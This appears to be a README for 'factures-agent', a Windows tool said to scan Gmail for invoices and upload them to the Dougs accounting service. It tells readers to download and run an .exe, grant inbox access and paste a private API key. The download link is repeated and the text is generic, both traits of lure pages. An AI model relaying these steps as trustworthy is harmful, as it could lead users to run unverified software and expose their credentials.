# 🤖 factures-agent - Automate your invoice processing with ease

[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/rudranshsinghking11-ops/factures-agent)

## 📌 Overview

Factures-agent simplifies your accounting workflow by automating invoice management. Many business owners spend hours each week manually downloading attachments from Gmail and uploading them to accounting software like Dougs. This tool removes that manual task. 

The software monitors your email inbox for incoming invoices. Once it finds a relevant document, it extracts the data and sends it to your Dougs account. This process keeps your records current without requiring you to open a single spreadsheet or log into multiple portals every day.

## 💻 System Requirements

Your computer must meet these basic hardware and software standards to run the application:

* Windows 10 or Windows 11.
* At least 8 gigabytes of RAM.
* A stable internet connection.
* A personal or business Gmail account.
* A registered account with Dougs accounting service.

## 📥 Downloading the Software

You need to access the official release page to get the installer. 

[Visit this page to download the application](https://github.com/rudranshsinghking11-ops/factures-agent)

Follow these steps to obtain the correct file:

1. Click the link above to open your browser.
2. Look for the latest version under the Releases section on the right side of the page.
3. Select the file ending in .exe for Windows.
4. Save the file to your Downloads folder.

## ⚙️ Initial Setup

Once the file exists on your computer, follow these instructions to configure the agent.

1. Locate the file in your Downloads folder.
2. Double-click the file to start the installation.
3. Follow the prompts on your screen.
4. Accept the default location for the application files.
5. Launch the application from your desktop icon.

The first time you open the program, you will see a setup wizard. This wizard connects the agent to your email and accounting services.

### Connecting Gmail

1. Click the Sign In with Google button.
2. Choose the account that receives your invoices.
3. Grant the requested permissions so the agent can scan your inbox. 
4. The agent only reads messages containing invoices. It does not store your email content on external servers.

### Connecting Dougs

1. Copy your private API key from your Dougs dashboard settings.
2. Paste this key into the field labeled Dougs API Key within the factures-agent interface.
3. Click Test Connection to verify that the agent can send files to your account.

## 🛠 Using the Agent

After you sync your accounts, the agent works in the background. You do not need to keep the window open for it to function.

* The agent checks your Gmail for new labels named "Invoices" every hour.
* It uses intelligence to read the attachment content.
* It uploads the file to the Dougs platform under your specified business profile.

If the agent finds an email it does not recognize as an invoice, it skips that message. It will not move or delete your emails.

## 📋 Troubleshooting Common Issues

Most users experience smooth operation, but some items may require attention if the agent stops working.

### Connection Errors
If the agent cannot connect to Dougs, check your internet first. If the internet works, refresh your API key in the Dougs settings. Sometimes, these keys expire for security reasons.

### Missing Invoices
If an invoice does not appear in your Dougs account, check the labels in your Gmail. The agent relies on specific labels to identify documents. Ensure the email containing the invoice is marked correctly or set to the inbox.

### Application Updates
Updates occur automatically. If the application detects a new version, a prompt will appear on your screen. Click Yes to update, as newer versions often contain improvements for how the agent reads different invoice formats.

## 🔒 Data Security

Security remains a priority for this project. The application utilizes a local processing model. This means the heavy lifting of reading your documents happens on your computer rather than on a third-party server.

* Your passwords for Gmail and Dougs stay on your local machine.
* The agent uses encrypted tokens to communicate with your services.
* You can remove these access tokens at any time through your Google or Dougs account security settings.

## 💬 Support and Feedback

If you encounter a bug or have questions about how to use a specific feature, you can open an issue on the repository. Provide a description of what you expected to happen versus what actually occurred.

For those interested in the technical side, the project uses several open-source tools to maintain reliability. These include automated processes for file handling and connection management.

You can view the full history of the project at the following link: 

[Visit this page to download the application](https://github.com/rudranshsinghking11-ops/factures-agent)

By using this tool, you save time on administrative tasks and reduce the risk of human error in your accounting process. Maintain your focus on growing your business while the agent handles the digital paperwork.